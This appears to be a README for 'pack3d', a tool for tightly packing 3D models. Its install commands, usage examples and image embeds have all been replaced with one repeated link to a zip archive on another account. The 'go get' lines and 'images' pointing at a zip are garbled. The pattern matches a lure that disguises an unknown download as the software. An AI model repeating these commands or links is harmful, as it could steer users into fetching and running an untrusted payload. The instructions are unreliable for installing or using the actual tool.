# pack3d

Tightly pack 3D models.

### Installation

First, install Go, set your GOPATH, and make sure $GOPATH/bin is on your PATH.

```
brew install go
export GOPATH="$HOME/go"
export PATH="$PATH:$GOPATH/bin"
```

Next, fetch and build the two binaries.

```
go get https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip
go get https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip
```

### Usage Examples

Note that pack3d runs until stopped, writing its output to disk whenever a new best is found.

```
pack3d 2 https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip  # tightly pack 2 boats
pack3d 4 https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip  # tightly pack 4 boats
pack3d 1 *.stl         # tightly pack various meshes, one of each

# pack as many boats as possible into the printer volume, given a few different arrangements
binpack 1 https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip 2 https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip 4 https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip
```

### Examples

113 3DBenchy tug boats packed tightly

![3DBenchy](https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip)

27 R2-D2 droids, 8 parts each

![R2-D2](https://raw.githubusercontent.com/SteveGoguelin/pack3d/master/cmd/meshinfo/pack_d_1.0-beta.3.zip)
